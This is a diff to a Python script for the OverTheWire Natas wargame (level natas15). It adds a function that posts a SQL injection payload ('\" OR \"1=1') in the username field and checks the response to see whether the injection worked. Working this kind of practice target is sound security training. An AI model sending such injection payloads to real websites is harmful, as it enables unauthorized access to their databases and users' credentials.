@@ -92,8 +92,14 @@ def obtener_password2(username,password,session,url):
         contador+=1
     print(f"la password es {l}")
 
-
-
+#Function to see if we can inject code
+def test_code_injection():
+    payload = {'debug':'True','username': "\" OR \"1=1" }
+    r= session.post(url,auth=(username, password),data=payload)
+    print(f"this is the content {r.content}")
+    if b"This user exist" in r.content:
+        print(f"look we injected code!")
+    
 
 if __name__ == "__main__" :
     username = "natas15"
@@ -101,5 +107,6 @@ if __name__ == "__main__" :
     url = "http://natas15.natas.labs.overthewire.org/index.php?debug=true"
     #['ñatas16', 'alice', 'charlie', 'bob', 'natas16', 'Ñatas16', 'Alice', 'Charlie', 'Bob', 'Natas16']
     session= iniciar_sesion(username,password,url)
+    test_code_injection()
     #names = obtener_nombres(username,password,session,url)
-    obtener_password(username,password,session,url)
+    #obtener_password(username,password,session,url)
